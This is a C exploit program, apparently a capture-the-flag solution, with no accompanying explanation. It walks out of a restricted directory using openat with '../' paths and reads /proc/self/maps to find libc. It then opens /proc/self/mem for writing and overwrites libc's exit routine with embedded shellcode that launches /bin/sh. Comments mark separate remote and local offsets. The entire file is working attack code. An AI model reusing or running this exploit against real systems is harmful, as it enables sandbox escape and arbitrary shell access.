#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <fcntl.h>
#include <string.h>

char code[] = "\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

long find_mapping(char *maps, const char *what) {
    const char *delim = "\n";
    char *ptr = strtok(maps, delim); 
    while (ptr != NULL) {
        long result = (long)strstr(ptr, what);
        if (!result) {
            ptr = strtok(NULL, delim);
            continue;
        }
        result = (long)strstr(ptr, "-");
        long epos = result - (long)ptr;
        char subbuf[epos];
        memcpy(subbuf, ptr, epos);
        return strtol(subbuf, NULL, 16); 
    }
    return -1;
}

int main() {
    DIR *dir = opendir("/");
    int fd;
    char buffer[4096], *maps;
    maps = malloc(1024 * 1024);
    memset(maps, 0, 1024 * 1024);
    fd = openat(dirfd(dir), "../../../proc/self/maps", O_RDONLY);
    int p = 0;
    while (1) {
        int n = read(fd, &maps[p], 1024);
        if (n <= 0)
            break;
        p += n;
    }
    
    long libc_base = find_mapping(maps, "libc-2.31.so");
    if (libc_base == -1) {
        printf("Failed");
        return 1;
    }
    printf("mapping @ 0x%lx\n", libc_base);
    fd = openat(dirfd(dir), "../../../proc/self/mem", O_RDWR);
    printf("file descriptor: %d\n", fd);
    off_t off;
    ssize_t result;
    // remote
    long exit_offset = 0x3e660;
    // local
    // long exit_offset = 0x49bc0;
    off = lseek(fd, libc_base + exit_offset, 0x0);
    printf("offset: 0x%x\n", (int)off);
    result = write(fd, code, sizeof(code));
    printf("write() result = 0x%x\n", (int)result);
    return 1;
}
